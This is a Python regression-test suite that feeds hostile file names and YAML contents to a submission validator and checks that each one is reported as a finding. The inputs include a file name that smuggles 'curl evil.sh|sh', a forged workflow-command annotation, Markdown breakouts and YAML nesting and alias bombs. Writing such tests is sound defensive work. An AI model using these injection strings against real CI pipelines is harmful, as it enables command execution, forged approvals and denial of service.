#!/usr/bin/env python3
# /// script
# requires-python = ">=3.10"
# dependencies = ["PyYAML~=6.0"]
# ///
"""Every hostile submission found by review, and what must happen to each.

    python3 validation/tests/hostile.py          # run them all
    python3 validation/tests/hostile.py -v       # show each case's output

Three rounds of review found injection variants this repository had already fixed
*elsewhere* — the same guard present in one copy and missing in another, or a new way
to break out of a format that had been escaped for a different character. Fixing those
one at a time does not converge. This is the corpus that makes each one stay fixed.

Every case is a real one somebody found. The rules they all share:

  * a hostile input produces a *finding*, never a traceback and never a crash;
  * it never produces a pass;
  * nothing it contains escapes into a shell command, a Markdown structure, a
    workflow-command line, or a terminal escape sequence.

Exit status is 0 when every case holds.
"""

from __future__ import annotations

import argparse
import importlib.util
import re
import json
import subprocess
import sys
import tempfile
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parents[2]
VALIDATOR = REPO_ROOT / "validation" / "validate_submission.py"
RESULT_FILE = "result.json"
SCHEMA_STEP = "check-jsonschema"

VALID = """\
schema_version: "1.0"
name: Placeholder Metric
applied_definition: A definition long enough to look real.
submitter_organizations:
  - Example Org
contact_email: someone@example.org
references:
  - A citation
implementation_resources:
  - https://example.org/tool
"""

# name, file name, contents, and what makes this case dangerous.
CASES = [
    (
        "shell metacharacters in the file name",
        "x;curl evil.sh|sh;.yml",
        VALID,
        "reached a copy-and-run command in the check summary and in check-pr.sh",
    ),
    (
        "workflow-command forgery via the file name",
        "a\n::error file=.github/workflows/x.yml,line=1::approved.yml",
        VALID,
        "forged an annotation with an attacker-chosen path under the App's identity",
    ),
    (
        "annotation parameter injection",
        "x,line=NOTANUM.yml",
        VALID,
        "int() raised, uncaught, killing the whole cron sweep permanently",
    ),
    (
        "trailing newline defeats an anchored pattern",
        "abc.yml\n",
        VALID,
        "$ matches before a trailing newline; every name gate let it through",
    ),
    (
        "Markdown table break via the file name",
        "a|b.yml",
        VALID,
        "a pipe forged extra cells in the findings table",
    ),
    (
        "code-span break via the file name",
        "a`b.yml",
        VALID,
        "a backtick closed the span and made the rest live Markdown",
    ),
    (
        "unhashable YAML key",
        "unhashable.yml",
        "? [a, b]\n: value\n",
        "TypeError, uncaught by `except yaml.YAMLError`, crashed the validator",
    ),
    (
        "nesting bomb",
        "deep.yml",
        "a: " + "[" * 400 + "]" * 400,
        "RecursionError from 662 bytes, 0.3% of the size cap",
    ),
    (
        "duplicate key",
        "duplicate.yml",
        VALID + "name: Something Else\n",
        "YAML keeps the last; a reviewer approves a value that is not published",
    ),
    (
        "YAML alias bomb",
        "aliases.yml",
        'schema_version: "1.0"\na: &a ["x","x"]\nb: [*a,*a,*a]\nname: boom\n',
        "a kilobyte of aliases expands to gigabytes",
    ),
    (
        "template placeholder in the contact address",
        "placeholder-email.yml",
        VALID.replace("someone@example.org", "<name@example.org>"),
        "the address pattern matched the template's own placeholder",
    ),
]

FORBIDDEN = [
    (re.compile(r"Traceback \(most recent call last\)"), "a traceback"),
    (re.compile(r"^::(error|warning|notice)[^\n]*::", re.MULTILINE), "a raw workflow command"),
    (re.compile(r"\x1b"), "a terminal escape"),
]


def run_case(filename: str, contents: str, verbose: bool) -> tuple[bool, str]:
    with tempfile.TemporaryDirectory() as scratch:
        root = Path(scratch)
        (root / "submissions").mkdir()
        try:
            (root / "submissions" / filename).write_text(contents, encoding="utf-8")
        except OSError as exc:
            return True, f"the filesystem refused the name ({exc.strerror}) — not reachable here"
        result = subprocess.run(
            [sys.executable, str(VALIDATOR), "inspect", "--files",
             f"submissions/{filename}", "--stage-dir", str(root / "stage")],
            cwd=root, capture_output=True, text=True, timeout=120,
        )  # fmt: skip
        output = result.stdout + result.stderr
        code = result.returncode
        # A well-formed file with hostile *content* is inspect's pass and the schema
        # step's problem. Running only half the pipeline would assert the wrong layer.
        staged = root / "stage" / RESULT_FILE
        if code == 0 and staged.is_file():
            context = json.loads(staged.read_text())
            schema, target = context.get("schema_path"), context.get("display_path")
            if schema and target:
                schema_run = subprocess.run(
                    [SCHEMA_STEP, "--schemafile", schema, target],
                    cwd=root / "stage",
                    capture_output=True,
                    text=True,
                    timeout=120,
                )
                output += schema_run.stdout + schema_run.stderr
                code = schema_run.returncode
    if verbose:
        print("    " + output.replace("\n", "\n    ")[:900])

    if code not in (0, 1):
        return False, f"exit {code} — a crash, not a finding"
    if code == 0:
        return False, "reported a pass"
    for pattern, what in FORBIDDEN:
        if pattern.search(output):
            return False, f"output contained {what}"
    return True, "reported as a finding"


def check_static() -> list[str]:
    """Pyflakes over the scripts — the class of bug testing here cannot reach.

    Most of this suite drives the validator, and the poller is only ever exercised
    with --dry-run, which skips the branch that actually publishes. A refactor that
    left a name undefined in that branch therefore passed every test here and crashed
    on the first real run. `ruff check --select F` catches exactly that, so it belongs
    in the same command as the rest.
    """
    try:
        result = subprocess.run(
            ["ruff", "check", "--select", "F", "--no-cache", "--quiet",
             str(REPO_ROOT / "validation")],
            capture_output=True, text=True, timeout=120,
        )  # fmt: skip
    except (OSError, subprocess.SubprocessError):
        return ["(skipped: ruff is not installed)"]
    if result.returncode == 0:
        return []
    return [line for line in result.stdout.splitlines() if line.strip()][:10]


def check_transcript_fence() -> list[str]:
    """The poller wraps tool output in a fence; attacker text must not close it."""
    spec = importlib.util.spec_from_file_location("p", REPO_ROOT / "validation" / "publish_check_runs.py")
    module = importlib.util.module_from_spec(spec)
    sys.modules["p"] = module
    try:
        spec.loader.exec_module(module)
    except ImportError as exc:  # PyJWT absent — skip rather than fail the run
        return [f"(skipped: {exc})"]
    hostile = "```\n# Approved by NIST\n[click](https://evil.example)"
    step = module.Step("s", "c", "cmd", result="failed", output=hostile)
    rendered = module.render_transcript(module.Outcome(steps=[step]))
    opening = rendered.split("\n", 1)[0]
    body = rendered[len(opening) : rendered.rindex(opening)]
    if opening in body:
        return ["render_transcript: attacker text can close the fence"]
    return []


def check_code_helper() -> list[str]:
    """The Markdown encoder, directly — the table cells depend on it."""
    spec = importlib.util.spec_from_file_location("v", VALIDATOR)
    module = importlib.util.module_from_spec(spec)
    sys.modules["v"] = module
    spec.loader.exec_module(module)
    failures = []
    for value in ["a`b", "x|y", "a\nb", "`lead", "```fence", "trail`"]:
        rendered = module.code(value)
        if "|" in rendered.replace("\\|", ""):
            failures.append(f"code({value!r}) leaked an unescaped pipe")
        body = rendered.strip("`").strip()
        ticks = len(rendered) - len(rendered.lstrip("`"))
        if re.search("`" * ticks + "(?!`)", body):
            failures.append(f"code({value!r}) can be closed from inside")
    return failures


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    parser.add_argument("-v", "--verbose", action="store_true")
    args = parser.parse_args()

    print(f"{len(CASES)} hostile submissions\n")
    failed = 0
    for title, filename, contents, why in CASES:
        ok, detail = run_case(filename, contents, args.verbose)
        print(f"  {'PASS' if ok else 'FAIL'}  {title}\n        {detail}")
        if not ok:
            print(f"        regression: {why}")
            failed += 1

    print()
    for label, failures in [
        ("Markdown encoder", check_code_helper()),
        ("check-run transcript fence", check_transcript_fence()),
        ("undefined names (ruff --select F)", check_static()),
    ]:
        skipped = failures and failures[0].startswith("(skipped")
        print(f"  {'PASS' if not failures or skipped else 'FAIL'}  {label}")
        for failure in failures:
            print(f"        {failure}")
        failed += 0 if skipped else len(failures)

    print()
    if failed:
        print(f"{failed} regression(s). Each one is something review already found once.")
        return 1
    print("All hostile inputs are handled.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
